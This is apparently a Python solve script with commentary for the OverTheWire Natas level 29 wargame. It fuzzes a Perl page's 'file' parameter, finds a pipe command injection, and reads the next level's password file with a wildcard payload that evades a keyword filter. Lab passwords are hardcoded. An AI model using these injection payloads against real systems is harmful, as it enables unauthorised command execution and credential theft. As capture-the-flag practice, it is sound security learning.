#!/usr/bin/env python

import requests
from urllib.parse import quote
from bs4 import BeautifulSoup

username = "natas29"
password = "airooCaiseiyee8he8xongien9euhe8b"

url = "http://%s.natas.labs.overthewire.org/" % username

session = requests.Session()

# after using the website a little we can se '/index.pl?file='
# in the url which we might be able to use as our path traversal entry
# so the first attempt with fuzzing this parameter with url encoding chars
# and trying to see the difference in length
# was 1st
""" for c in string.printable:
    c_url_encoded = quote(c, safe='')
    new_url = url + 'index.pl?file=' + c_url_encoded
    response = session.get(new_url, auth=(username, password))
    content = response.content
    # you can do that better, like storing those results lengths in a list and sort them
    # like burpsuit_intruder
    print(f"trying: {c} which its url_encoded is {c_url_encoded} results in response_content with length {len(content)}") """

# from 1st we can see on different in the response when we do 'file=%30' or 'file=0'
# as url_encoded_of(0) = %30 --> so we'll keep that in mind

# was 2nd
# the next try, we may want to start another fuzzing using a wordlist for
# either local file inclusion or a command injection
# first we'll try the LFI one and see the response_content_length as well
# note: this will include using a file named 'small_LFI_linux.txt' and
# should be in the same folder as this simple script
# another note: those two text files is part of 'PayloadAllThings'
""" filename = 'Traversal.txt'
i = 1
with open(filename, 'r') as myfile:
    for line in myfile:
        new_url = url + 'index.pl?file=' + line
        response = session.get(new_url, auth=(username, password))
        content = response.content
        print(f"Attempt #{i}\ntrying: {line}results in response_content with length {len(content)}\n"+'='*50)
        i += 1 """
# the previous try didn't result in any success
# the next is about command injection type of fuzzing
# interesting..
# at first we can see that there some bad requests, so we'll filter them based on the statues code
# and after some tries we can see that the default response_length is about 1668
# so let's filter that, too
# and vola, it's a command_injection challenge
""" filename = 'command-execution-unix.txt'
i = 1
with open(filename, 'r') as myfile:
    for line in myfile:
        line_url_encoded = quote(line, safe='')
        new_url = url + 'index.pl?file=' + line_url_encoded
        response = session.get(new_url, auth=(username, password))
        status = response.status_code
        content_length = len(response.content)
        if status == 200 and content_length != 1668:
            print(f"Attempt #{i}\ntrying: {line}{line_url_encoded}\nresults in response_content with length {len(content)} and status: {status}\n"+'='*50)
            i += 1 """
# and of the payloads that works is url_encode_of(|ls;) = %7cls%3b
# so let's try and cat the password fro /etc/natas_webpass/natas30

""" injection = "|cat /etc/natas_webpass/natas30;" # this doens't seem to be working
injection_url_encoded = quote(injection, safe='') """

# let's look at the source code
""" source_code = "|cat ./index.pl;"
source_code_url_encoded = quote(source_code, safe='') """

# so let's try another trick
injection = "|cat /etc/*_webpass/*30;"  # this doens't seem to be working
injection_url_encoded = quote(injection, safe="")

print(injection_url_encoded)
new_url = url + "index.pl?file=" + injection_url_encoded
response = session.get(new_url, auth=(username, password))
content = response.content
"""
and the filter was:
if($f=~/natas/){
        print "meeeeeep!
    <br/>
    ";
}
"""


soup = BeautifulSoup(content, "html.parser").prettify()
print(soup)

print()  # just for having some space

# this time we got an /index-source.html
# the documentation is above :)
#
# we got it right:
# Username: natas30
# Password: wie9iexae0Daihohv8vuu3cei9wahf0e
